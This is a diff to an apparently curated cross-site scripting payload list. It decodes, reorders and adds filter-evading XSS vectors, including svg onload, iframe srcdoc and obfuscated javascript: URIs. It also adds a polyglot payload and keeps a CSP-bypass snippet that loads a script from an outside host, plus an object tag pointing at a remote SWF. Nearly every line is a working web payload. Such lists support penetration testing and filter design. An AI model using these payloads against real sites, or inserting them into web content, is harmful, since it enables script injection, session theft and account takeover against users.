@@ -6,7 +6,7 @@
 
 <AuDiO/**/oNLoaDStaRt='(_=/**/confirm/**/(1))'/src><!--x
 
-<mArquee onStart%3D[~[onmouseleave(([[(alert(1))]]))]] ]
+<mArquee onStart=[~[onmouseleave(([[(alert(1))]]))]] ]
 
 <img src="/" =_=" title="onerror='/**/prompt(1)'">
 
@@ -14,21 +14,27 @@
 
 <a/onmousemove=alert(1)//>renwax23
 
-<object allowscriptaccess=always><param name=code value=http://renwa.tk/xss.swf>
+<object allowscriptaccess=always><param name=code value=https://l0.cm/xss.swf>
 
 <svg+onload=eval(location.hash.substr(1))>#alert(1)
 
-<button onmousemove="javascript:alert(1)">renwa
-
-<BoDy%0AOnpaGeshoW=%2bwindow.prompt(1)
-
-<details/open/ontoggle=confirm(%27XSS%27)>
+<details/open/ontoggle=confirm('XSS')>
 
 </script><svg><script>alert(1)/&apos;
 
 <svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;// 
 
-<output name="jAvAsCriPt://&NewLine;\u0061ler&#116(1)" onclick="eval(name)">X</output>	  
+<svg </onload ="1> (_=prompt,_(1)) "">
+
+<svg 1=""onload=alert(1)>
+
+<output name="jAvAsCriPt://&NewLine;\u0061ler&#116(1)" onclick="eval(name)">X</output>
+
+<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;23&rpar;&gt;" />
+
+<button onmousemove="javascript:alert(1)">renwa
+
+<BoDy%0AOnpaGeshoW=+window.prompt(1)
 
 <a href=[0x0b]renwax23" onfocus=prompt(1) autofocus fragment="
 
@@ -36,7 +42,7 @@
 
 <script>a=eval;b=alert;a(b(/ 1/.source));</script>'">
 
-<!%27/!"/!\%27/\"/--!><Input/Type=Text%20AutoFocus%20*/;%20OnFocus=(confirm)(1)%20//>
+<!'/!"/!\'/\"/--!><Input/Type=Text AutoFocus */; OnFocus=(confirm)(1) //>
 
 <style><img src="</style><img src=x "><object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 
@@ -180,6 +186,11 @@ x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253
 CSP BYPASS:
 
 <script>f=document.createElement("iframe");f.id="pwn";f.src="/robots.txt";f.onload=()=>{x=document.createElement('script');x.src='//bo0om.ru/csp.js';pwn.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);</script>
+
+
+POLYGLOT:
+
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
 
 
 HYPERLINK TAG INJECTION:
